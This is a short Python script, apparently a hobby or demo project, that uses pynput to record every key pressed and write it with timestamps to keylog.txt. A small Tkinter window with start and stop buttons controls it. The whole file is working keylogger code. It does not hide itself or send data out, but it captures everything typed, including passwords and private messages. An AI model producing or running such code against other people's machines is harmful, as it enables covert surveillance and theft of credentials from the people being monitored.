import logging
from pynput import keyboard
import tkinter as tk
from threading import Thread

# log the keystrokes to a file
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")
def on_release(key):
    if key == keyboard.Key.esc:
        return False
def start_keylogger():
    global listen
    listen = keyboard.Listener(on_press=on_press, on_release=on_release)
    listen.start()
    listen.join()
def stop_keylogger():
    listen.stop()

#GUI
root = tk.Tk()
root.title("Keylogger Control")
start_button = tk.Button(root, text="Start Keylogger", command=lambda: Thread(target=start_keylogger).start())
start_button.pack(pady=10)
stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger)
stop_button.pack(pady=10)
root.mainloop()

